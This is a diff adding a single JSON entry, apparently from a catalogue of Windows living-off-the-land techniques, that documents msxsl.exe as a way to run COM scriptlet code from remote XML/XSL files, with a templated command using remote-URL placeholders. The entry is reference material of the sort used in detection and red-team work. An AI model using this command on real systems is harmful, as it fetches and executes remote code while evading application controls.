@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-msxsl-exe-execute-2",
+  "name": "LOLBAS · msxsl.exe (Execute) #2",
+  "command": "msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl}",
+  "description": "Run COM Scriptlet code within the shellcode.xml(xsl) file (remote).",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "msxsl",
+    "execute"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/msxsl/",
+  "upstream_id": "msxsl.exe/Execute/1",
+  "category": "lolbas",
+  "subcategory": "execute",
+  "references": [
+    {
+      "title": "LOLBAS — msxsl.exe",
+      "url": "https://lolbas-project.github.io/lolbas/msxsl/"
+    }
+  ]
+}
